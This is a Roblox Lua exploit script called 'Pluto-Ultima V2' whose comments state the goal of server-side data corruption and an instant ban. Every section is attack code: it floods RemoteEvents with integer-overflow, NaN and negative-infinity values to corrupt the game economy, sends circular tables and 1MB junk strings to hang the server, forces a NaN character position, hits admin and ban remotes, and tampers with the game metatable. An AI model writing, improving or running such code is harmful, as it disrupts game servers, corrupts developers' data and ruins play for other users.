-- [[ PLUTO-ULTIMA V2: STATIONARY DESTRUCTION ]]
-- TARGET: 100% INSTANT BAN & SERVER-SIDE DATA CORRUPTION
-- NOTE: TELEPORTATION DISABLED TO PREVENT SCRIPT RESET

print("Pluto-Ultima V2: Initiating Stationary Attack. Anchor set.")

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local LP = game:GetService("Players").LocalPlayer

-- 1. THE PLUTO LOADING UI
local sg = Instance.new("ScreenGui", LP:WaitForChild("PlayerGui"))
local f = Instance.new("Frame", sg)
f.Size = UDim2.new(1, 0, 0, 100)
f.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
f.BorderSizePixel = 4
f.BorderColor3 = Color3.fromRGB(0, 255, 255)

local t = Instance.new("TextLabel", f)
t.Size = UDim2.new(1, 0, 1, 0)
t.Text = "PLEASE WAIT WHILE PLUTO SCRIPT IS LOADING"
t.TextColor3 = Color3.fromRGB(0, 255, 255)
t.Font = Enum.Font.Code
t.TextSize = 28

-- 2. ECONOMY CORRUPTION (THE "INSTANT KILL" TRIGGER)
-- Attacks the bank with 64-bit Integer Overflows and NaN.
task.spawn(function()
    local Events = ReplicatedStorage:WaitForChild("Events")
    while true do
        pcall(function()
            -- Sending the Maximum 64-bit Integer (9.2 Quintillion)
            -- This triggers an automatic "Data-Store Fraud" flag.
            Events:FireServer("DonateMoney", {["Recipient"] = LP, ["Amount"] = 9223372036854775807})
            Events:FireServer("Earn", {["Amount"] = 0/0, ["Job"] = "PizzaBaker"})
            Events:FireServer("PurchaseItem", {["Item"] = "House", ["Price"] = -math.huge})
        end)
        task.wait(0.001)
    end
end)

-- 3. THE "CIRCULAR PACKET CRASH" (SERVER-SIDE HANG)
-- Designed to make the server thread hang while trying to read your data.
task.spawn(function()
    local Circular = {}
    Circular[1] = Circular 
    
    while true do
        for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
            if remote:IsA("RemoteEvent") then
                pcall(function()
                    -- Spamming 2,000 recursive loops per frame to maximize CPU load
                    for i = 1, 2000 do
                        remote:FireServer(Circular)
                    end
                end)
            end
        end
        RunService.Heartbeat:Wait()
    end
end)

-- 4. PHYSICS & BOUNDARY MALICE
-- Teleporting to 'NaN' (Not a Number) to break the server's spatial grid.
task.spawn(function()
    local Char = LP.Character or LP.CharacterAdded:Wait()
    local Root = Char:WaitForChild("HumanoidRootPart")
    
    RunService.RenderStepped:Connect(function()
        -- Setting position and rotation to "Not a Number"
        -- This is a 100% detectable illegal physics state.
        Root.CFrame = CFrame.new(0/0, 0/0, 0/0) * CFrame.Angles(0/0, 0/0, 0/0)
    end)
end)

-- 5. HONEYPOT MODERATION SWEEP
-- Directly attacks hidden remotes meant for Admins and Moderation.
task.spawn(function()
    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") and (v.Name:find("Admin") or v.Name:find("Ban") or v.Name:find("Mod")) then
            task.spawn(function()
                while true do
                    v:FireServer("PLUTO_X_BYPASS", {["BanUser"] = LP, ["Force"] = true})
                    task.wait()
                end
            end)
        end
    end
end)

-- 6. METATABLE TAMPERING (HYPERION ATTACK)
-- This signals the anti-cheat that the engine's memory has been compromised.
task.spawn(function()
    local mt = getrawmetatable(game)
    if setreadonly then setreadonly(mt, false) end
    local old = mt.__index
    mt.__index = newcclosure(function(t, k)
        return old(t, k)
    end)
end)

-- 7. MASSIVE DATA REPLICATION INJECTION
-- Fills the server's network buffer with 1MB "Junk" strings.
task.spawn(function()
    local JunkData = string.rep("PLUTO_X_OVERLOAD_", 60000)
    while true do
        pcall(function()
            -- Flooding the main game events with massive data chunks
            ReplicatedStorage.Events:FireServer(JunkData)
        end)
        task.wait()
    end
end)

print("Pluto-Ultima V2: All systems active. Staying on server until ban.")
